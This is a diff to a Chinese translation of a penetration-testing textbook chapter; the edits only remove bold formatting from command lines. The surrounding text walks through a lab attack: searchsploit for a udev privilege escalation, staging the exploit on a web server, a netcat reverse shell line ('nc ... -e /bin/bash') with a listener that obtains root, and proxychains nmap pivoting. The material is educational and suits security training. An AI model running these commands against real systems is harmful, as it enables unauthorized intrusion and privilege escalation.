@@ -415,7 +415,7 @@ Kali Linux 包含来自 *Exploitdb.com* 的本地公开漏洞代码库，路径�
 示例 13-13. 搜索 Exploitdb 仓库
 
 ```
-root@kali:~# **/usr/share/exploitdb/searchsploit udev**
+root@kali:~# /usr/share/exploitdb/searchsploit udev
  Description                                                           Path
 ---------------------------------------------------------------------- ----------------------
 Linux Kernel 2.6 UDEV Local Privilege Escalation Exploit               /linux/local/8478.sh
@@ -455,7 +455,7 @@ gcc: no input files
 如你所见，GCC 报告它没有收到任何输入，但这也告诉我们 GCC 已经安装好了。接下来是将我们的漏洞代码复制到 Linux 目标系统。Linux 的 `wget` 命令可以让我们通过命令行从 web 服务器下载文件，所以我们将 C 代码复制到 Kali Linux web 服务器，如这里所示。确保在 Kali 中运行 apache2 web 服务器。
 
 ```
-root@kali:~# **cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www**
+root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www
 ```
 
 现在切换到你的 SSH shell，并使用 `wget` 下载文件，如示例 13-15 中所示。
@@ -520,7 +520,7 @@ nc 192.168.20.9 12345 -e /bin/bash
 在运行我们的漏洞代码之前，我们需要在 Kali 系统上设置一个监听器，以捕获传入的 Netcat shell。
 
 ```
-root@kali:~# **nc -lvp 12345**
+root@kali:~# nc -lvp 12345
 listening on [any] 12345 ...
 ```
 
@@ -535,7 +535,7 @@ Linux 目标系统似乎没有任何反应，但如果你回到 Kali 上的 Netc
 示例 13-17. 获取 root 权限
 
 ```
-root@kali:~# **nc -lvp 12345**
+root@kali:~# nc -lvp 12345
 listening on [any] 12345 ...
 192.168.20.11: inverse host lookup failed: Unknown server error : Connection timed out
 connect to [192.168.20.9] from (UNKNOWN) [192.168.20.11] 33191
@@ -1123,7 +1123,7 @@ socks4  127.0.0.1 1080
 示例 13-32. 通过 ProxyChains 运行 Nmap
 
 ```
-root@kali:~# **proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190**
+root@kali:~# proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-25 15:00 EDT
 |S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190.165:445-<><>-OK❶
